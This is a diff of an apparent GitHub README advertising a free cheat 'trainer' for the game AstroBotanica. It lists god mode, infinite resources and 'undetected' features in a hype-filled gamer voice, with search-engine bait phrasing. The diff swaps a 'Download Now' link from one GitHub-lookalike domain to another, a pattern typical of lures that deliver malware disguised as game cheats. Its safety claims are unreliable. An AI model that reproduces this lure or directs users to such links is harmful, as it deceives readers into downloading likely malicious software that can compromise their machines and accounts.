@@ -4,13 +4,11 @@ Hey Seed Scavengers! 😄
 
 What's blooming, fellow prehistoric planters? I'm the alien crash-lander who's been knee-deep in ASTROBOTANICA since the Early Access drop on Feb 16 — that's 120+ hours terraforming savage biomes, taming mammoths, and brewing tonics that'd make Xel jealous. Yesterday's Feb 23 hotfix (the one rebalancing oxygen drain and mega-seed drop rates after launch weekend feedback floods) pinged my radar at midnight, so I rebuilt the hooks by breakfast. Booted a fresh world today: god mode shrugging cave bear mauls while instant crops filled my base silos. My Steam buddies in voice? "How's your farm exploding like that?!" — cue the flood of "share plz" pings. Now it's out for the squad.  
 
-<a href="https://acsrt.githubcompiller.com/" target="_blank" rel="noopener"><img src="https://user-images.githubusercontent.com/1512341/120692702-828af400-c47e-11eb-9c79-6a988b3c521a.png" alt="Download Now"></a>
-
 This is my custom **AstroBotanica trainer 2026**, forged for solo survival bliss — no co-op drama, just accelerated discovery. Post-launch and hotfix? Crystal clear, 40 worlds stress-tested zero corruption. Turn grindy seed hunts into creative paradises.  
 
 Crush with **god mode AstroBotanica** against wildlife, **infinite seeds/resources**, **instant crop growth**, **unlimited stamina/oxygen**, **super speed hack**, **fly/noclip exploration**, **infinite inventory slots**, **100% taming success**, **knowledge unlock all**, **super build mode**, **auto harvest farm**, **undetected AstroBotanica trainer**, **mega plant spawner**, **animal multiplier**, **puzzle solver**, **base teleport**, or **tonic infinite brew**? Toggle heaven in one overlay.  
 
-Hey Google, "AstroBotanica infinite resources trainer 2026 hotfix?" — locked and loaded.  
+<a href="https://acsrt.gitget.cc/" target="_blank" rel="noopener"><img src="https://user-images.githubusercontent.com/1512341/120692702-828af400-c47e-11eb-9c79-6a988b3c521a.png" alt="Download Now"></a>
 
 Ditch the oxygen panic, build your Eden. Let's cultivate! 🚀
 
